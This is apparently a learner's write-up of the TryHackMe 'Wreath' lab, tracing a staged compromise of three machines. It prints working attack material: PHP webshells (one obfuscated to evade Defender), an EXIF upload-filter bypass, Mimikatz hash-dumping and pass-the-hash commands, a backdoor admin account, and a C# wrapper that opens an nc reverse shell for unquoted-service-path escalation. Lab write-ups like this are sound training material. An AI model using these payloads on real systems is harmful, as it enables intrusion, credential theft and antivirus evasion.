# Wreath — TryHackMe | Full Write-Up
**Author: Obada**  
**Date: March 2026**  
**Difficulty: Medium - Advanced**

---

## Room Overview

Wreath is one of TryHackMe's most comprehensive rooms. It simulates a realistic Red Team engagement where you compromise a three-machine network, covering three main topics:

1. **Pivoting** — Moving laterally through internal networks
2. **C2 Frameworks (Empire)** — Command and Control infrastructure
3. **AV Evasion** — Bypassing antivirus software

---

## Network Map

```
My Machine (Kali/Kubuntu)     .200 (Linux - CentOS)     .150 (Windows - Git Server)     .100 (Windows - Thomas' PC)
10.250.180.6           ←→    10.200.180.200             10.200.180.150                  10.200.180.100
                              prod-serv (first)          git-serv (second)               wreath-pc (last)
```

---

## Phase 1: Initial Access — .200 (Linux Server)

### Discovery
The first machine (10.200.180.200) runs CentOS with Webmin. It was vulnerable to **CVE-2019-15107** (Webmin RCE).

### Exploitation
Used a public exploit to obtain a root shell, establishing a foothold into the internal network.

---

## Phase 2: Pivoting — Mapping the Internal Network

### Why Pivoting?

```
Me ← → Internet ← → .200 (directly accessible)
                       ↕
                 Internal Network
                 .150 .100 (NOT directly accessible!)
```

The internal machines are firewalled from the internet, but .200 can see them. So .200 becomes our **pivot point**.

### Tools Learned

| Tool | Purpose |
|------|---------|
| SSH Tunnelling | Port forwarding over SSH |
| sshuttle | VPN-like tunneling via SSH |
| Chisel | SOCKS5 proxy over HTTP |
| socat | Port relay |
| plink.exe | Windows SSH client |
| netsh portproxy | Windows port forwarding |

### Network Enumeration

Uploaded a static nmap binary to .200 (dynamic binaries fail due to missing libraries):

```bash
# On .200
./nmap-NEPHOS -sn 10.200.180.1-255 -oN scan-NEPHOS
```

**Results:**
- `10.200.180.100` — All ports filtered
- `10.200.180.150` — Open ports: 80, 3389, 5985

**Analysis:**
- Port 3389 = RDP → Windows machine
- Port 5985 = WinRM → Windows Remote Management
- Port 80 = HTTP → Web server

### Setting Up sshuttle

```bash
sshuttle -r root@10.200.180.200 --ssh-cmd "ssh -i /home/obada/Wreath/id_rsa" 10.200.180.0/24 -x 10.200.180.200
```

This routes all traffic to the 10.200.180.0/24 range through .200, making the internal network accessible.

---

## Phase 3: Exploiting .150 (Windows - Git Server)

### Discovery

With sshuttle active, browsed to `http://10.200.180.150` and found **GitStack** (a Git server for Windows).

### Exploitation — GitStack RCE (EDB-43777)

Found a public exploit for GitStack 2.3.10. Converted it from Python 2 to Python 3 using `2to3`, then executed it.

The exploit planted a PHP webshell:
```php
<?php system($_POST['a']); ?>
```

Webshell URL: `http://10.200.180.150/web/exploit.php`

**Verification:**
```bash
curl -X POST http://10.200.180.150/web/exploit.php -d "a=whoami"
# Output: nt authority\system
```

### Reverse Shell via Relay

**Problem:** .150 cannot connect directly to my machine (firewall blocks it).  
**Solution:** Use .200 as a relay.

```
.150 → .200 (ncat listener:15000) → My Machine (listener:4444)
```

**Steps:**

1. Open firewall port on .200:
```bash
firewall-cmd --zone=public --add-port 15000/tcp
```

2. Start ncat listener on .200:
```bash
/tmp/ncat -lvnp 15000
```

3. Send PowerShell reverse shell via Burp Suite through the webshell.

### Stabilisation

Created a local account on .150:

```powershell
net user NEPHOS password123! /add
net localgroup Administrators NEPHOS /add
net localgroup "Remote Management Users" NEPHOS /add
```

### WinRM Access

```bash
evil-winrm -u NEPHOS -p password123! -i 10.200.180.150
```

---

## Phase 4: Credential Dumping — Mimikatz

### The Problem

evil-winrm provides a **medium integrity** shell — Mimikatz requires SYSTEM privileges.

**Key Lesson:** The webshell ran as `nt authority\system` — use it instead!

### Solution — Mimikatz via Webshell

```bash
curl -X POST http://10.200.180.150/web/exploit.php -d "a=C:\Users\NEPHOS\Documents\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" \"exit\""
```

### Results

| User | NTLM Hash |
|------|-----------|
| Administrator | `37db630168e5f82aafa8461e05c6bbd1` |
| Thomas | `02d90eda8f6b6b06c32d5f207831101f` |

### Cracking Thomas' Hash

Used crackstation.net:
```
02d90eda8f6b6b06c32d5f207831101f → i<3ruby
```

### Pass-the-Hash

```bash
evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.180.150
```

---

## Phase 5: Discovering .100 (Thomas' Personal PC)

### Port Scanning via Invoke-Portscan

Since we're on Windows (.150), nmap isn't available. Used **Invoke-Portscan.ps1** (Empire PowerShell module):

```bash
evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.180.150 -s /home/obada/Wreath/
```

```powershell
Invoke-Portscan.ps1
Invoke-Portscan -Hosts 10.200.180.100 -Ports "80,443,3389,5985,22,21,8080,445,139,135"
```

**Results:** `openPorts: {80, 3389}` — Windows machine with web server.

### Port Forwarding to Access the Web Server

```powershell
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=10.200.180.100 connectport=80
netsh advfirewall firewall add rule name="Port 8080" dir=in action=allow protocol=TCP localport=8080
```

Now accessible at `http://10.200.180.150:8080` — Thomas' personal portfolio website.

---

## Phase 6: Source Code Analysis

### Stealing the Git Repository

Thomas uses GitStack on .150. The repository is stored locally:

```powershell
Compress-Archive -Path C:\Gitstack\Repositories\Website.git -DestinationPath C:\Windows\Temp\Website.zip
```

**Transfer chain:** .150 → ncat relay → .200 → scp → my machine.

### Extracting Commits with GitTools

```bash
GitTools/Extractor/extractor.sh /home/obada/Wreath Website
```

**Commit order (chronological):**
1. `70dde80...` — Static Website Commit (oldest)
2. `82dfc97...` — Initial Commit for the back-end
3. `345ac8b...` — Updated the filter (most recent)

---

## Phase 7: File Upload Bypass + AV Evasion

### Code Analysis (index.php)

```php
$goodExts = ["jpg", "jpeg", "png", "gif"];
if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
    header("location: ./?msg=Fail");
    die();
}
```

**Vulnerability 1 — Extension Filter:**  
`explode()` splits on `.` and only checks index `[1]`:
- `shell.php.jpg` → checks `php` → FAIL
- `shell.jpg.php` → checks `jpg` → PASS ✅

**Vulnerability 2 — getimagesize():**  
Checks if file is a real image. Bypassed by embedding PHP payload in a real image's EXIF data.

**Additional protection:** Basic authentication — credentials: `thomas:i<3ruby`

### Proof of Concept

```bash
curl -o test-NEPHOS.jpeg https://www.gstatic.com/webp/gallery/1.jpg
exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-NEPHOS.jpeg
cp test-NEPHOS.jpeg test-NEPHOS.jpeg.php

curl -x socks5://127.0.0.1:1080 -u 'thomas:i<3ruby' \
  -F "file=@test-NEPHOS.jpeg.php;type=image/jpeg" \
  -F "upload=Upload" http://10.200.180.100/resources/
```

**Verification:** `http://10.200.180.100/resources/uploads/test-NEPHOS.jpeg.php` returned `Test Payload` ✅

### AV Evasion — PHP Obfuscation

Windows Defender is active on .100. The payload must be obfuscated.

**Original payload:**
```php
<?php
    $cmd = $_GET["wreath"];
    if(isset($cmd)){
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    die();
?>
```

**Obfuscated payload:**
```php
<?php $p0=$_GET[base64_decode('d3JlYXRo')];if(isset($p0)){echo base64_decode('PHByZT4=').shell_exec($p0).base64_decode('PC9wcmU+');}die();?>
```

**Embedding and uploading:**
```bash
exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" shell-NEPHOS.jpeg.php

curl -x socks5://127.0.0.1:1080 -u 'thomas:i<3ruby' \
  -F "file=@shell-NEPHOS.jpeg.php;type=image/jpeg" \
  -F "upload=Upload" http://10.200.180.100/resources/
```

**RCE confirmed:**
```bash
curl -x socks5://127.0.0.1:1080 -u 'thomas:i<3ruby' \
  "http://10.200.180.100/resources/uploads/shell-NEPHOS.jpeg.php?wreath=whoami"
# Output: wreath-pc\thomas
```

---

## Phase 8: Privilege Escalation on .100

### Setting Up Chisel Proxy

Since .100 can't connect to my machine directly, used Chisel with .150 as an intermediary:

```powershell
# On .150
.\chisel-NEPHOS.exe server -p 47000 --socks5
```

```bash
# On my machine
./chisel client 10.200.180.150:47000 socks
# SOCKS5 proxy available at 127.0.0.1:1080
```

### Getting a Reverse Shell

Uploaded nc64.exe and triggered a reverse shell through the webshell:

```
.100 webshell → nc-NEPHOS.exe → .200 ncat relay → my listener
```

### Privilege Enumeration

```
whoami /priv
→ SeImpersonatePrivilege: Enabled
```

```
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
→ SystemExplorerHelpService
  Path: C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe
  (No quotation marks around path!)
```

```
sc qc SystemExplorerHelpService
→ SERVICE_START_NAME: LocalSystem ✅
```

```
powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
→ BUILTIN\Users: Allow FullControl ✅
```

### Unquoted Service Path — Explanation

When Windows starts a service with spaces in the path and no quotes:
```
C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe
```

It tries these paths in order:
```
C:\Program.exe                                         ← no write access
C:\Program Files.exe                                   ← no write access  
C:\Program Files (x86)\System.exe                      ← no write access
C:\Program Files (x86)\System Explorer\System.exe      ← we have FullControl! ✅
```

By placing our malicious binary at `C:\Program Files (x86)\System Explorer\System.exe`, Windows will execute it as SYSTEM when the service starts.

### Building the Wrapper (C#)

```csharp
using System;
using System.Diagnostics;

namespace Wrapper{
    class Program{
        static void Main(){
            Process proc = new Process();
            ProcessStartInfo procInfo = new ProcessStartInfo(
                "c:\\xampp\\htdocs\\resources\\uploads\\nc-NEPHOS.exe",
                "10.200.180.200 4444 -e cmd.exe"
            );
            procInfo.CreateNoWindow = true;
            proc.StartInfo = procInfo;
            proc.Start();
        }
    }
}
```

```bash
# Compile with Mono on Linux
mcs Wrapper.cs
```

### Executing the Exploit

```bash
# Transfer wrapper to .100
curl http://10.250.180.6/Wrapper.exe -o c:\xampp\htdocs\resources\uploads\wrapper-NEPHOS.exe
```

```cmd
# Test wrapper (should get a reverse shell)
c:\xampp\htdocs\resources\uploads\wrapper-NEPHOS.exe

# Place exploit binary
copy c:\xampp\htdocs\resources\uploads\wrapper-NEPHOS.exe "C:\Program Files (x86)\System Explorer\System.exe"

# Trigger exploit by restarting service
sc stop SystemExplorerHelpService
sc start SystemExplorerHelpService
```

**Result: SYSTEM shell on .100!** 🎉

### Cleanup

```cmd
del "C:\Program Files (x86)\System Explorer\System.exe"
sc start SystemExplorerHelpService
```

---

## Challenges & Mistakes

### 1. Mimikatz Failed via evil-winrm
**Problem:** evil-winrm provides medium integrity, not SYSTEM.  
**Fix:** Used the webshell (which ran as SYSTEM from the start) to execute Mimikatz.  
**Lesson:** Always leverage the highest privilege access point available.

### 2. File Transfer from .150 Was Difficult
**Problem:** evil-winrm timed out on large files; SMB was blocked.  
**Fix:** Used ncat relay through .200, then scp to my machine.

### 3. Chisel Reverse Mode Failed for .150
**Problem:** .150 can't reach my machine directly.  
**Fix:** Reversed the roles — ran Chisel as server on .150 and connected from my machine.

### 4. No Write Access to C:\Windows\Temp on .100
**Problem:** Permission denied when saving nc64.exe to Windows\Temp.  
**Fix:** Used the xampp uploads directory instead.

### 5. exiftool Won't Write to .php Files
**Problem:** exiftool rejects writing to PHP files.  
**Fix:** Added EXIF data while the file had a .jpeg extension, then renamed it.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| sshuttle | VPN-like pivoting over SSH |
| evil-winrm | WinRM shell |
| Chisel | SOCKS5 proxy |
| Mimikatz | Extract NTLM hashes |
| netsh portproxy | Windows port forwarding |
| Invoke-Portscan.ps1 | Port scanning on Windows |
| GitTools/Extractor | Extract git repositories |
| exiftool | Modify EXIF metadata |
| Mono (mcs) | Cross-compile C# on Linux |
| ncat (static) | Static netcat binary |
| Crackstation | Online hash cracker |

---

## Kill Chain Summary

```
.200 (Linux CentOS)
  → CVE-2019-15107 Webmin RCE → root shell

.150 (Windows Git Server)
  → GitStack RCE (EDB-43777) → SYSTEM webshell
  → Mimikatz via webshell → NTLM hashes
  → Crack Thomas' hash → i<3ruby
  → Pass-the-Hash → Administrator

.100 (Windows PC)
  → Chisel SOCKS5 via .150 → web server access
  → File Upload Bypass (double extension + EXIF injection)
  → PHP Obfuscation → bypass Windows Defender
  → RCE as thomas
  → Unquoted Service Path (SystemExplorerHelpService)
  → C# wrapper + cross-compilation → SYSTEM
```

---

## Key Takeaways

- **Pivoting is fundamental** — real networks are segmented; understanding how to move laterally is essential for any penetration tester.
- **Static binaries** are your best friend on targets with missing libraries.
- **Privilege levels matter** — always identify your current integrity level and use the highest available access point.
- **File upload bypasses** often combine multiple techniques (extension + content validation).
- **Antivirus evasion** is a cat-and-mouse game; obfuscation buys time but isn't bulletproof.
- **Unquoted service paths** are surprisingly common in real environments, especially for third-party software.
- **Cross-compilation** (C# on Linux for Windows) is a critical skill in environments where you can't compile on the target.

---

*Written as part of my journey toward becoming a Penetration Tester.*

**XENOS | Obada**  
*GitHub: obadahamed.github.io*
